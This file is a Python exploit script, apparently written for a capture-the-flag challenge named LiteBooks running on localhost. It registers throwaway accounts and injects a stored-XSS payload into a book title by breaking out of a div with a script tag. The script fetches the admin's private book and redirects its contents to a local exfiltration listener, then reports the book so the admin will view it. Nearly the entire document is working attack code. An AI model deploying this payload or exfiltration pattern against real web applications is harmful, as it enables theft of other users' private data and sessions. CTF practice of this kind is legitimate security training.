#!/usr/bin/env python3

import requests
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import urllib.parse as urlparse

# ---------------- CONFIG ---------------- #

TARGET_URL = "http://localhost:50001"

# CHANGE THIS: admin's book liteId with the flag
ADMIN_LITE_ID = "QXfE_f29aw"

# Where to exfiltrate the admin book contents
EXFIL_URL = "http://localhost:8000"

# ---------------------------------------- #


class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse.urlparse(self.path)
        qs = urlparse.parse_qs(parsed.query)
        print("\n[+] Incoming request to exfil server:")
        print("    PATH:", self.path)
        if "flag" in qs:
            raw = qs["flag"][0]
            decoded = urlparse.unquote(raw)
            print("\n[+] FLAG PAYLOAD (URL-decoded):")
            print(decoded)
            print("\nSearch for the flag in the 'link' field.\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *args):
        return


def start_exfil_server():
    server = HTTPServer(("0.0.0.0", 8000), ExfilHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print("[*] Exfil server listening on http://localhost:8000")
    return server


class User:
    def __init__(self, name, pw):
        self.name = name
        self.pw = pw
        self.s = requests.Session()
        self.token = None

    def register(self):
        print(f"[*] Registering {self.name}")
        r = self.s.post(
            f"{TARGET_URL}/register",
            params={"username": self.name, "password": self.pw},
        )
        print("   /register ->", r.status_code, r.text)
        return r.status_code == 200

    def login(self):
        print(f"[*] Logging in {self.name}")
        r = self.s.post(
            f"{TARGET_URL}/api/login",
            params={"username": self.name, "password": self.pw},
        )
        if r.status_code != 200:
            print("   /api/login ->", r.status_code, r.text)
            return False
        data = r.json()
        self.token = data["token"]
        self.s.cookies.set("token", self.token)
        print("   Logged in OK")
        return True


def create_xss_book(victim: User):
    print("[*] Creating malicious book as victim...")

    # JS that steals the admin book and exfiltrates it
    js = (
        f"fetch('/view/admin/{ADMIN_LITE_ID}')"
        ".then(r=>r.text())"
        f".then(f=>{{location='{EXFIL_URL}?flag='+encodeURIComponent(f)}})"
    )

    # Inject XSS in the TITLE via a <script> tag
    # Break out of the <div> and insert our script
    title_payload = f"</div><script>{js}</script><div>"

    book = {
        "title": title_payload,
        "author": "TotallyHarmless",
        "pages": 123,
        # Valid, simple imageLink (no need for broken image anymore)
        "imageLink": "/assets/icons/bookshelf.svg",
        "link": "",
        "fav": False,
        "read": False,
    }

    r = victim.s.post(f"{TARGET_URL}/api/create", json=book)
    print("   /api/create ->", r.status_code, r.text)
    if r.status_code != 200:
        return None

    liteId = r.json()["book"]["liteId"]
    print(f"[+] Malicious book created, liteId = {liteId}")
    print(f"[+] Visit this as ADMIN to trigger XSS:")
    print(f"    {TARGET_URL}/liteShare/{victim.name}/{liteId}")
    return liteId


def report_book(reporter: User, victim_name: str, liteId: str):
    print("[*] Reporter sending /report...")
    payload = {"user": victim_name, "liteId": liteId}
    r = reporter.s.post(f"{TARGET_URL}/report", json=payload)
    print("   /report ->", r.status_code, r.text)
    return r.status_code == 200


def main():
    print("""
╔═══════════════════════════════════════════════╗
║ LiteBooks Stored-XSS → Admin Flag Exploit    ║
╚═══════════════════════════════════════════════╝
""")

    server = start_exfil_server()

    ts = int(time.time())
    victim = User(f"victim{ts}", "pass123")
    reporter = User(f"reporter{ts}", "pass456")

    if not victim.register() or not victim.login():
        print("[-] Victim setup failed")
        return
    if not reporter.register() or not reporter.login():
        print("[-] Reporter setup failed")
        return

    liteId = create_xss_book(victim)
    if not liteId:
        print("[-] Failed to create malicious book")
        return

    report_book(reporter, victim.name, liteId)

    print(f"""

======================================================================
 BOT IS DISABLED — YOU MUST TRIGGER XSS MANUALLY

  Login as admin:  admin / admin
  Visit this URL:

    {TARGET_URL}/liteShare/{victim.name}/{liteId}

  The injected <script> in the book title will run and:
    - fetch /view/admin/{ADMIN_LITE_ID}
    - redirect to {EXFIL_URL}?flag=<URL-encoded-JSON>
  Your exfil server will print the stolen JSON.
======================================================================
""")

    print("[*] Waiting. Press Ctrl+C when done.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down exfil server...")
        server.shutdown()


if __name__ == "__main__":
    main()
